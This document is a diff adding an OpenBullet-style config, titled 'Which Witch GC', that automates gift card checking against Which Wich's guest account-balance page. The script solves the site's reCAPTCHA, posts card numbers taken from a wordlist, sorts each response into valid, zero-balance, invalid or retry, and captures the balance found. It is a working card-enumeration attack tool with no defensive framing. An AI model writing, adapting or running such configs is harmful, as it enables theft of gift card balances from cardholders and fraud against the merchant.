@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "Which Witch GC",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-06T17:46:32.5181628+02:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#recaptcha RECAPTCHA "https://whichwich.myguestaccount.com/guest/nologin/account-balance" "6LdndBYUAAAAAIE_sQA2y29GSRaKJHKx2DodPT6m" -> VAR "captcha" 
+#get REQUEST GET "https://whichwich.myguestaccount.com/guest/nologin/account-balance" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#true PARSE "<SOURCE>" LR "hidden\" name=\"" "\"" Recursive=FALSE -> VAR "true" "" "" 
+#submit PARSE "<SOURCE>" LR "nologinCardnumberSubmitButton\" name=\"" "\"" Recursive=FALSE -> VAR "submit" "" "" 
+#post REQUEST POST "https://whichwich.myguestaccount.com/guest/nologin/account-balance" AutoRedirect=TRUE 
+  CONTENT "<true>=true&cardnum=<USER>&g-recaptcha-response=<captcha>&<submit>=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Retry OR 
+    KEY "Invalid CAPTCHA. Please try again." 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "\">$0.00" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid card number." 
+  KEYCHAIN Success OR 
+    KEY "<div class=\"col-md-2\">$" 
+#balance PARSE "<SOURCE>" LR "<div class=\"col-md-2\">" "</div>" Recursive=FALSE -> CAP "Balance" "" "" 
